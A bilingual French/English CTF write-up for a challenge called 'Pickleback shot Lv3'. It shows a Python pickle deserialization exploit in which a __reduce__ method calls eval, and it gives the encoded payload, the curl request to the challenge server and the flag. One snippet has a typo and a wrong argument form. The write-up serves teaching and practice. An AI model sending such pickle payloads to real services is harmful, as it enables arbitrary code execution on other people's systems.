# Pickleback shot Lv3

## Write-up (français)

Dans le code fourni, il est observable que la liste des différents ingrédients est mélangée, et par la suite, de nouveaux ingrédients sont ajoutés à la liste.

Dans un premier temps, nous devons trouver un moyen de trier la liste de manière non aléatoire, mais de manière contrôlée. Pour ce faire, nous devons modifier la graine (seed) du module 'random' afin d'obtenir un contrôle sur le processus de mélange.

Après avoir mené quelques recherches, nous constatons qu'un code de cette forme nous permet d'atteindre notre objectif :
```py
import pickle
import base64
from typing import Tuple

class SetSeed:
    def __reduce__(self) -> Tuple:
        return (eval, "ramdom.seed(10)")

if __name__ == '__main__':
    pickled = pickle.dumps(SetSeed())
    print(base64.urlsafe_b64encode(pickled))
```

Cela mélange les ingrédients dans l'ordre suivant (pour une seed de 10):
```py
['steak', 'sauce', 'bread', 'olive', 'yeast', 'basil', 'onion', 'melon', 'peach', 'lemon', 'honey', 'flour', 'grape', 'apple', 'sugar', 'nutty', 'beans', 'mango', 'cream']
```

On peut donc déterminer ce que donne la préparation actuelle :
```py
def mix(s1: str, s2: str) -> str:
    if len(s1) != len(s2):
        raise ValueError('Invalid input')
    
    result = ""
    for c1, c2 in zip(s1, s2):
        r = 0
        
        for i in range(0, 8):
            bc1 = (ord(c1) >> i) & 1
            bc2 = (ord(c2) >> i) & 1
            
            bc_result = (bc1 == 0 or bc2 == 1) and (bc2 == 0 or bc1 == 1)
            
            r += (bc_result << i)
        
        result += chr(r)
    
    return result

ingredients = ['steak', 'sauce', 'bread', 'olive', 'yeast', 'basil', 'onion', 'melon', 'peach', 'lemon', 'honey', 'flour', 'grape', 'apple', 'sugar', 'nutty', 'beans', 'mango', 'cream']


preparation = ingredients[0]
for ingredient in ingredients[1:]:
    preparation = mix(preparation, ingredient)
    
print(preparation) # qsnr`
```

Maintenant que l'on connaît la préparation actuelle (qsnr\`), on peut calculer les ingrédients manquants pour obtenir `flag-`.

Comme la fonction `mix` représente une double implication, voici la table de vérité associée :

| a | b | a <=> b |
| - | - | :-----: |
| 0 | 0 |    1    |
| 0 | 1 |    0    |
| 1 | 0 |    0    |
| 1 | 1 |    1    |


La stratégie :
- Identifier les bits que l'on souhaite inverser
    - Si l'on souhaite passer de 1 à 0, on remplace par un 0
    - Si l'on souhaite passer de 0 à 1, on remplace par un 0
- Si l'on souhaite conserver notre 0, on remplace par un 1
- Si l'on souhaite conserver notre 1, on remplace par un 1

```
qsnr` : 01110001 01110011 01101110 01110010 01100000
           ^ ^^^    ^^^^^     ^^^^    ^ ^ ^  ^  ^^ ^   (les bit que l'on veut flipper)
????? : 11101000 11100000 11110000 11101010 10110010
flag- : 01100110 01101100 01100001 01100111 00101101
```

Voici ce à quoi pouvait ressembler le script de résolution: 

```py
def mix(s1: str, s2: str) -> str:
        if len(s1) != len(s2):
            raise ValueError('Invalid input')
        
        result = ""
        for c1, c2 in zip(s1, s2):
            r = 0
            
            for i in range(0, 8):
                bc1 = (ord(c1) >> i) & 1
                bc2 = (ord(c2) >> i) & 1
                
                bc_result = (bc1 == 0 or bc2 == 1) and (bc2 == 0 or bc1 == 1)
                
                r += (bc_result << i)
            
            result += chr(r)
        
        return result

def find_ingredient(got, want):
    result = ''
    for ch1, ch2 in zip(got, want):
        b_ch1 = bin(ord(ch1))[2:].zfill(8)
        b_ch2 = bin(ord(ch2))[2:].zfill(8)
        
        b_result = ''
        for b1, b2 in zip(b_ch1, b_ch2):
            if b1 != b2:
                b_result += '0'
            else:
                b_result += '1'
                
        result += chr(int(b_result, 2))
    return result
            

preparation = "qsnr`"
last_ingredient = find_ingredient(preparation, "flag-")

print(' '.join([bin(ord(char))[2:].zfill(8) for char in last_ingredient]))
print(mix(preparation, last_ingredient))
```

L'ingrédient manquant était donc: `"\xE8\xE0\xF0\xEA\xB2"`

Maintenant il est temps de construire le pickle à envoyer au serveur.
```py
import pickle
import base64
from typing import Tuple

class SetSeed:
    def __reduce__(self) -> Tuple:
        return (eval, ("(lambda : (random.seed(10), ['\xE8\xE0\xF0\xEA\xB2'])[1])()"),)

if __name__ == '__main__':
    pickled = pickle.dumps(SetSeed())
    print(base64.urlsafe_b64encode(pickled))
```

La chaîne de caractère en base64 résultante est la suivante: 
```
gASVTQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwxKGxhbWJkYSA6IChyYW5kb20uc2VlZCgxMCksIFsnw6jDoMOww6rCsiddKVsxXSkoKZSFlFKULg==
```

Lorsque l'on envoie ces données au serveur, on reçoit une image en base64
```
curl -X GET -d "data=gASVTQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwxKGxhbWJkYSA6IChyYW5kb20uc2VlZCgxMCksIFsnw6jDoMOww6rCsiddKVsxXSkoKZSFlFKULg==" http://<IP>:<PORT>/get_pickle
```

Une fois le base64 transformé en png, on retrouve l'image:

![flag](./images/flag.png)

## Write-up (english)

In the provided code, it is noticeable that the list of various ingredients is shuffled, and subsequently, new ingredients are added to the list.

Initially, we need to find a way to sort the list in a non-random but controlled manner. To achieve this, we need to modify the seed of the 'random' module to gain control over the shuffling process.

After conducting some research, we find that code of this form enables us to achieve our goal:

```py
import pickle
import base64
from typing import Tuple

class SetSeed:
    def __reduce__(self) -> Tuple:
        return (eval, "ramdom.seed(10)")

if __name__ == '__main__':
    pickled = pickle.dumps(SetSeed())
    print(base64.urlsafe_b64encode(pickled))
```

This shuffles the ingredients in the following order (for a seed of 10):
```py
['steak', 'sauce', 'bread', 'olive', 'yeast', 'basil', 'onion', 'melon', 'peach', 'lemon', 'honey', 'flour', 'grape', 'apple', 'sugar', 'nutty', 'beans', 'mango', 'cream']
```

We can thus determine what the current preparation yields :
```py
def mix(s1: str, s2: str) -> str:
    if len(s1) != len(s2):
        raise ValueError('Invalid input')
    
    result = ""
    for c1, c2 in zip(s1, s2):
        r = 0
        
        for i in range(0, 8):
            bc1 = (ord(c1) >> i) & 1
            bc2 = (ord(c2) >> i) & 1
            
            bc_result = (bc1 == 0 or bc2 == 1) and (bc2 == 0 or bc1 == 1)
            
            r += (bc_result << i)
        
        result += chr(r)
    
    return result

ingredients = ['steak', 'sauce', 'bread', 'olive', 'yeast', 'basil', 'onion', 'melon', 'peach', 'lemon', 'honey', 'flour', 'grape', 'apple', 'sugar', 'nutty', 'beans', 'mango', 'cream']


preparation = ingredients[0]
for ingredient in ingredients[1:]:
    preparation = mix(preparation, ingredient)
    
print(preparation) # qsnr`
```

Now that we know the current preparation (qsnr\`), we can calculate the missing ingredients to obtain `flag-`.

As the `mix` function represents a double implication, here is the associated truth table:

| a | b | a <=> b |
| - | - | :-----: |
| 0 | 0 |    1    |
| 0 | 1 |    0    |
| 1 | 0 |    0    |
| 1 | 1 |    1    |

The strategy:
- Identify the bits that we want to flip
    - If we want to change from 1 to 0, we replace with 0
    - If we want to change from 0 to 1, we replace with 0
- If we want to keep our 0, we replace with 1
- If we want to keep our 1, we replace with 1"

```
qsnr` : 01110001 01110011 01101110 01110010 01100000
           ^ ^^^    ^^^^^     ^^^^    ^ ^ ^  ^  ^^ ^   (les bit que l'on veut flipper)
????? : 11101000 11100000 11110000 11101010 10110010
flag- : 01100110 01101100 01100001 01100111 00101101
```

Here's what the resolution script could have looked like:

```py
def mix(s1: str, s2: str) -> str:
        if len(s1) != len(s2):
            raise ValueError('Invalid input')
        
        result = ""
        for c1, c2 in zip(s1, s2):
            r = 0
            
            for i in range(0, 8):
                bc1 = (ord(c1) >> i) & 1
                bc2 = (ord(c2) >> i) & 1
                
                bc_result = (bc1 == 0 or bc2 == 1) and (bc2 == 0 or bc1 == 1)
                
                r += (bc_result << i)
            
            result += chr(r)
        
        return result

def find_ingredient(got, want):
    result = ''
    for ch1, ch2 in zip(got, want):
        b_ch1 = bin(ord(ch1))[2:].zfill(8)
        b_ch2 = bin(ord(ch2))[2:].zfill(8)
        
        b_result = ''
        for b1, b2 in zip(b_ch1, b_ch2):
            if b1 != b2:
                b_result += '0'
            else:
                b_result += '1'
                
        result += chr(int(b_result, 2))
    return result
            

preparation = "qsnr`"
last_ingredient = find_ingredient(preparation, "flag-")

print(' '.join([bin(ord(char))[2:].zfill(8) for char in last_ingredient]))
print(mix(preparation, last_ingredient))
```

The resulting base64-encoded string is as follows:
```
gASVTQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwxKGxhbWJkYSA6IChyYW5kb20uc2VlZCgxMCksIFsnw6jDoMOww6rCsiddKVsxXSkoKZSFlFKULg==
```

When we send this data to the server, we receive an image in base64.

```
curl -X GET -d "data=gASVTQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwxKGxhbWJkYSA6IChyYW5kb20uc2VlZCgxMCksIFsnw6jDoMOww6rCsiddKVsxXSkoKZSFlFKULg==" http://<IP>:<PORT>/get_pickle
```

Once the base64 is transformed into a PNG, we find the image:

![flag](./images/flag.png)


## Flag

```
flag-GrrrrD0ntT@K3MyP1cl3s
```
